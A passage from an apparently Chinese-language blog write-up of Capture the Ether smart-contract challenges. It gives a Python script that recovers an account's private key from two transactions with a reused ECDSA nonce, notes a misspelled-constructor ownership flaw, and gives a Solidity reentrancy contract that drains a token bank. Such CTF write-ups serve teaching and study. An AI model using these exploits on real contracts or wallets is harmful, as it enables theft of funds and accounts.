tx.s,</span><br><span class="line">        v: tx.v </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> signature = ethers.utils.joinSignature(expandedSig);</span><br><span class="line">    <span class="keyword">const</span> txData = &#123;</span><br><span class="line">        gasPrice: tx.gasPrice,</span><br><span class="line">        gasLimit: tx.gasLimit,</span><br><span class="line">        value: tx.value,</span><br><span class="line">        nonce: tx.nonce,</span><br><span class="line">        data: tx.data,</span><br><span class="line">        chainId: tx.chainId,</span><br><span class="line">        to: tx.to <span class="comment">// you might need to include this if it&#x27;s a regular txand not simply a contract deployment</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> rsTx = <span class="keyword">await</span> ethers.utils.resolveProperties(txData);</span><br><span class="line">    <span class="keyword">const</span> raw = ethers.utils.serializeTransaction(rsTx); <span class="comment">// returns RLPencoded tx</span></span><br><span class="line">    <span class="keyword">const</span> msgHash = ethers.utils.keccak256(raw); <span class="comment">// as specified byECDSA</span></span><br><span class="line">    <span class="keyword">const</span> msgBytes = ethers.utils.arrayify(msgHash); <span class="comment">// create binaryhash</span></span><br><span class="line">    <span class="keyword">const</span> recoveredPubKey = ethers.utils.recoverPublicKey(msgBytes,signature);</span><br><span class="line">    <span class="comment">// recoveredPubKey is uncompressed, so starts with 0x04</span></span><br><span class="line">    <span class="keyword">const</span> compressedPubKey =</span><br><span class="line">ethers.utils.arrayify(recoveredPubKey).slice(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// console.log(compressedPubKey)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> answerPubKeyHex =</span><br><span class="line">Buffer.from(compressedPubKey).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`0x<span class="subst">$&#123;answerPubKeyHex&#125;</span>`</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="number">0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4</span></span><br></pre></td></tr></table></figure>

<p><strong>参考链接：</strong></p>
<p><a href="https://learnblockchain.cn/books/geth/part3/sign-and-valid.html">签名与校验 :: 以太坊技术与实现 (learnblockchain.cn)</a></p>
<h3 id="3-Account-Takeover"><a href="#3-Account-Takeover" class="headerlink" title="3. Account Takeover"></a>3. Account Takeover</h3><p><strong>题目描述：</strong></p>
<p>To complete this challenge, send a transaction from the <code>owner</code>‘s account.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AccountTakeoverChallenge &#123;</span><br><span class="line">    address owner &#x3D; 0x6B477781b0e68031109f21887e6B5afEAaEB002b;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=GBkT19uH2RQ">Pinky and The Brain Intro</a>.</p>
<p><strong>解题：</strong></p>
<p>题目要求我们获取账户私钥</p>
<p>找到该账户的所有交易，发现有两笔交易使用了同样的 r</p>
<p>解题脚本如下：：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line">infura_url = <span class="string">&#x27;https://ropsten.infura.io/v3/[api_key]&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line">a= web3.eth.get_transaction(<span class="string">&quot;0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;r = &#123;0&#125;&quot;</span>.format(a.r.hex()))</span><br><span class="line">log.info(<span class="string">&quot;s = &#123;0&#125;&quot;</span>.format(a.s.hex()))</span><br><span class="line">log.info(<span class="string">&quot;v= &#123;0&#125;&quot;</span>.format(a.v))</span><br><span class="line"></span><br><span class="line">a= web3.eth.get_transaction(<span class="string">&quot;0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;r = &#123;0&#125;&quot;</span>.format(a.r.hex()))</span><br><span class="line">log.info(<span class="string">&quot;s = &#123;0&#125;&quot;</span>.format(a.s.hex()))</span><br><span class="line">log.info(<span class="string">&quot;v= &#123;0&#125;&quot;</span>.format(a.v))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span></span><br><span class="line"><span class="comment"># txid:</span></span><br><span class="line"><span class="number">0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396</span></span><br><span class="line">s2 = <span class="number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span></span><br><span class="line">z2 = <span class="number">0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04</span></span><br><span class="line"><span class="comment"># txid:</span></span><br><span class="line"><span class="number">0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009</span></span><br><span class="line">s1 = <span class="number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span></span><br><span class="line">z1 = <span class="number">0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c</span></span><br><span class="line"><span class="comment"># prime order p</span></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"><span class="comment"># based on Fermat&#x27;s Little Theorem</span></span><br><span class="line"><span class="comment"># works only on prime n</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_mod</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pow(a, n - <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line">k=(z1-z2)*inverse_mod(s1-s2,p)%p               <span class="comment">#derivekfors1-s2</span></span><br><span class="line">pk = (s1 * k - z1) * inverse_mod(r, p) % p     <span class="comment"># derive private key </span></span><br><span class="line">pkNeg=(-s1*(-k%p)-z1)*inverse_mod(r,p)%p       <span class="comment">#-k(modp)of s1 - s2 == -s1 + s2, check -s1</span></span><br><span class="line">log.info(<span class="string">&#x27;k           = &#123;:x&#125;&#x27;</span>.format(k))</span><br><span class="line">log.info(<span class="string">&#x27;k negation  = &#123;:x&#125;&#x27;</span>.format(-k % p))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pk == pkNeg:  <span class="comment"># should not be false</span></span><br><span class="line">    log.success(<span class="string">&#x27;private key = &#123;:x&#125;&#x27;</span>.format(pk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k=(z1-z2)*inverse_mod(s1+s2,p)%p <span class="comment">#derivekfors1+s2</span></span><br><span class="line">pk = (s1 * k - z1) * inverse_mod(r, p) % p <span class="comment"># derive private key pkNeg=(-s1*(-k%p)-z1)*inverse_mod(r,p)%p #-k(modp)of s1 + s2 == -s1 - s2, double check -s1</span></span><br><span class="line">log.info(<span class="string">&#x27;k           = &#123;:x&#125;&#x27;</span>.format(k))</span><br><span class="line">log.info(<span class="string">&#x27;k negation  = &#123;:x&#125;&#x27;</span>.format(-k % p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pk == pkNeg:  <span class="comment"># should not be false</span></span><br><span class="line">    log.success(<span class="string">&#x27;private key = &#123;:x&#125;&#x27;</span>.format(pk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line">acct =Account.from_key(<span class="string">&quot;614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;account addr &#123;:x&#125;&#x27;</span>.format(acct.address))</span><br></pre></td></tr></table></figure>

<p>然后用这个账户调用 <code>authenticate</code> 函数即可：</p>
<p><strong>参考链接：</strong></p>
<p><a href="https://medium.com/coinmonks/smart-contract-exploits-part-3-featuring-capture-the-ether-accounts-c86d7e9a1400">Smart Contract Exploits Part 3 — Featuring Capture the Ether (Accounts) | by Enigmatic | Coinmonks | Medium</a></p>
<h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="1-Assume-ownership"><a href="#1-Assume-ownership" class="headerlink" title="1. Assume ownership"></a>1. Assume ownership</h3><p><strong>题目描述：</strong></p>
<p>To complete this challenge, become the <code>owner</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function AssumeOwmershipChallenge() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=ytc4_JJWqMQ">Owner Of A Lonely Heart</a>.</p>
<p><strong>解题：</strong></p>
<p>构造函数存在拼写错误 , 导致合约部署的时候这个函数没有运行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AssumeOwnershipChallenge</span><br><span class="line">AssumeOwmershipChallenge</span><br></pre></td></tr></table></figure>

<p>因此我们可以直接调用 <code>AssumeOwmershipChallenge</code> 函数设置 owner</p>
<h3 id="2-Token-bank"><a href="#2-Token-bank" class="headerlink" title="2. Token bank"></a>2. Token bank</h3><p><strong>题目描述：</strong></p>
<p>I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses <a href="https://github.com/ethereum/EIPs/issues/223">ERC 223</a> to accept the incoming tokens.</p>
<p>The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    &#x2F;&#x2F; Track how many tokens are owned by each address.</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    string public name &#x3D; &quot;Simple ERC223 Token&quot;;</span><br><span class="line">    string public symbol &#x3D; &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals &#x3D; 18;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply &#x3D; 1000000 * (uint256(10) ** decimals);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function SimpleERC223Token() public &#123;</span><br><span class="line">        balanceOf[msg.sender] &#x3D; totalSupply;</span><br><span class="line">        emit Transfer(address(0), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isContract(address _addr) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            &#x2F;&#x2F;retrieve the size of the code on target address, this needs assembly</span><br><span class="line">            length :&#x3D; extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        return length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        return transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">        if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] &#x3D; value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;&#x3D; balanceOf[from]);</span><br><span class="line">        require(value &lt;&#x3D; allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line">        allowance[from][msg.sender] -&#x3D; value;</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function TokenBankChallenge(address player) public &#123;</span><br><span class="line">        token &#x3D; new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Divide up the 1,000,000 tokens, which are all initially assigned to</span><br><span class="line">        &#x2F;&#x2F; the token contract&#39;s creator (this contract).</span><br><span class="line">        balanceOf[msg.sender] &#x3D; 500000 * 10**18;  &#x2F;&#x2F; half for me</span><br><span class="line">        balanceOf[player] &#x3D; 500000 * 10**18;      &#x2F;&#x2F; half for you</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return token.balanceOf(this) &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;&#x3D; balanceOf[from]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] +&#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=WDbOK_fDu9Y">A British Bank</a>.</p>
<p><strong>解题：</strong></p>
<p>题目要求我们将 Bank 的余额清零。</p>
<p><code>TokenBankChallenge.withdraw(uint256)</code> 中存在重入漏洞：</p>
<p>它先发出消息调用 <code>token.transfer(msg.sender)</code> 后修改状态</p>
<p>前者又会发起外部调用 <code>ITokenReceiver(to).tokenFallback()</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isContract(to)) &#123;</span><br><span class="line">    ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>判断了to地址是否是个合约地址，如果是合约的话就用<code>ITokenReceiver</code>接口来调用<code>to</code>合约的<code>tokenFallback</code>函数，在银行合约里这个函数用更改目标的balance，但是<code>to</code>是我们可控的 ， 我们只需部署攻击合约，且该合约也存在 <code>tokenFallback</code> 函数，然后函数中再调用 <code>TokenBankChallenge.withdraw</code> , 就可以合约身份执行<code>withdraw</code>函数</p>
<p>步骤：</p>
<ol>
<li>部署攻击合约</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenBankChallenge &#123;</span><br><span class="line">    function token() external returns (address);</span><br><span class="line">    function balanceOf(address from) external returns (uint256);</span><br><span class="line">    function isComplete() external view returns (bool);</span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line">interface ISimpleERC223Token &#123;</span><br><span class="line">    function totalSupply() external returns (uint256);</span><br><span class="line">    function balanceOf(address from) external returns (uint256);</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool success); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankSolver &#123;</span><br><span class="line">    ITokenBankChallenge public challenge;</span><br><span class="line">    ISimpleERC223Token public token;</span><br><span class="line">    uint256 public balance &#x3D; 500000000000000000000000;</span><br><span class="line"></span><br><span class="line">    function TokenBankSolver(address _addr) public &#123;</span><br><span class="line">        challenge &#x3D; ITokenBankChallenge(_addr);</span><br><span class="line">        token &#x3D; ISimpleERC223Token(challenge.token());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns(uint256) &#123;</span><br><span class="line">            token.transfer(challenge, balance);</span><br><span class="line">            challenge.withdraw(balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">            token.balanceOf(from); </span><br><span class="line">            require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line">            uint256 challengeLeftBalance &#x3D; token.balanceOf(address(challenge));</span><br><span class="line">            bool keepRecursing &#x3D; challengeLeftBalance &gt; 0;</span><br><span class="line">            if (keepRecursing) &#123;</span><br><span class="line">                uint256 v &#x3D; value &lt; challengeLeftBalance? value: challengeLeftBalance;</span><br><span class="line">                challenge.withdraw(v);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns(bool) &#123;</span><br><span class="line">        return challenge.isComplete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ol start="2">
<li><p>将 Bank中的 balance 全部提换成 Token -&gt; TokenBankChallenge.withdraw =&gt;SimpleERC223Token</p>
</li>
<li><p>设置 allowance :<code> allowance[from=player][msg.sender=player] =500000000000000000000000</code></p>
</li>
<li><p>将 player 的 Token 全部转到攻击合约上：</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simpleERC223Token_contract.functions.transferFrom(player_account.address,to&#x3D;attack_contract_address,value&#x3D;500000000000000000000000)</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>调用攻击合约的 attack 函数</li>
</ol>
<p>这样就完成了攻击步骤</p>
<p>至此就全部做完了：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png"></a></p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%B3%E5%8F%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">1.</span> <span class="toc-text">平台地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Warmup"><span class="toc-number">2.</span> <span class="toc-text">Warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Deploy-a-contract"><span class="toc-number">2.1.</span> <span class="toc-text">1. Deploy a contract</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-callme"><span class="toc-number">2.2.</span> <span class="toc-text">2. callme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Choose-a-nickname"><span class="toc-number">2.3.</span> <span class="toc-text">3. Choose a nickname</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lotteries"><span class="toc-number">3.</span> <span class="toc-text">Lotteries</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Guesst-the-number"><span class="toc-number">3.1.</span> <span class="toc-text">1. Guesst the number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Guess-the-secret-number"><span class="toc-number">3.2.</span> <span class="toc-text">2.  Guess the secret number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Guess-the-random-number"><span class="toc-number">3.3.</span> <span class="toc-text">3.   Guess the random number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Guess-the-new-number"><span class="toc-number">3.4.</span> <span class="toc-text">4. Guess the new number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Predict-the-future"><span class="toc-number">3.5.</span> <span class="toc-text">5.  Predict the future</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Predict-the-block-hash"><span class="toc-number">3.6.</span> <span class="toc-text">6.   Predict the block hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Math"><span class="toc-number">4.</span> <span class="toc-text">Math</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Token-sale"><span class="toc-number">4.1.</span> <span class="toc-text">1. Token sale</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Token-whale"><span class="toc-number">4.2.</span> <span class="toc-text">2. Token whale</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Retirement-fund"><span class="toc-number">4.3.</span> <span class="toc-text">3. Retirement fund</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Mapping"><span class="toc-number">4.4.</span> <span class="toc-text">4. Mapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Donation"><span class="toc-number">4.5.</span> <span class="toc-text">5. Donation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Fifty-years"><span class="toc-number">4.6.</span> <span class="toc-text">6. Fifty years</span></a></li></ol></li><li class="toc-item 